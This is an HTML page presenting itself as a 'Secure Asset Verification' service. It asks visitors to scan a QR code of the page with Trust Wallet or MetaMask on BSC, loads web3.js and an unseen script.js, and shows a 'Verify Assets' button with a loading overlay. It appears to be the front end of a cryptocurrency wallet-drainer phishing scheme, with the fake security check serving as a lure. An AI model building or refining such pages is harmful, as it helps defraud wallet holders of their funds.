<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Asset Verification</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <style>
        body { margin: 0; font-family: 'Inter', sans-serif; background: #0b0e11; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .card { background: #1e2329; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 90%; max-width: 380px; }
        #qrcode { background: white; padding: 15px; border-radius: 10px; margin: 20px auto; display: inline-block; }
        .btn { background: #f0b90b; color: #000; border: none; padding: 15px; width: 100%; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; }
        h2 { color: #f0b90b; margin: 0; }
        p { color: #929aa5; font-size: 13px; }
        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 100; flex-direction: column; align-items: center; justify-content: center; }
    </style>
</head>
<body>

    <div class="card">
        <h2>Verify Assets</h2>
        <p>Scan this QR with Trust Wallet / MetaMask to start automated security verification.</p>
        
        <div id="qrcode"></div> <button id="nextBtn" class="btn">Verify Assets</button>
        <p style="margin-top:15px;">Note: Ensure you are on BSC Network</p>
    </div>

    <div id="overlay">
        <div style="border: 4px solid #333; border-top: 4px solid #f0b90b; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite;"></div>
        <p id="status-text" style="color:#f0b90b; margin-top:15px; font-weight:bold;">Initializing...</p>
    </div>

    <script src="script.js"></script>
    <script>
        // Automatic QR Generator
        new QRCode(document.getElementById("qrcode"), {
            text: window.location.href,
            width: 200,
            height: 200
        });
    </script>
</body>
</html>
